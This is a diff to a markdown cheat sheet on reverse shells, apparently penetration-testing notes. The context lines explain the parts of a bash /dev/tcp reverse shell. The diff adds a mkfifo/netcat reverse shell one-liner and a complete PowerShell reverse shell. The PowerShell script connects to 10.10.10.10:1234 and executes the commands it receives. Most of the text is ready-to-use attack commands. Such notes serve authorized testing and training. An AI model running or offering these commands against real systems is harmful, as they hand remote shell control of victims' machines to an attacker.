@@ -39,6 +39,14 @@ bash -c 'bash -i >& /dev/tcp/$ip$/$listen 0>&1'
 - `>&` takes the output and errors, bundles them together to whatever comes next, `>` for redirecting, and `&` for bundling
 - `/dev/tcp/$ip/$listen` destination for the redirection, treated as a network connection to the IP on the port `$listen`
 - `0>&1` redirect inputs to where output is going, our network `$ip:$port$`
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
+```
+
+#### PowerShell reverse shell
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
 ## Things to know
 - Command executed depend on the OS of the target
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
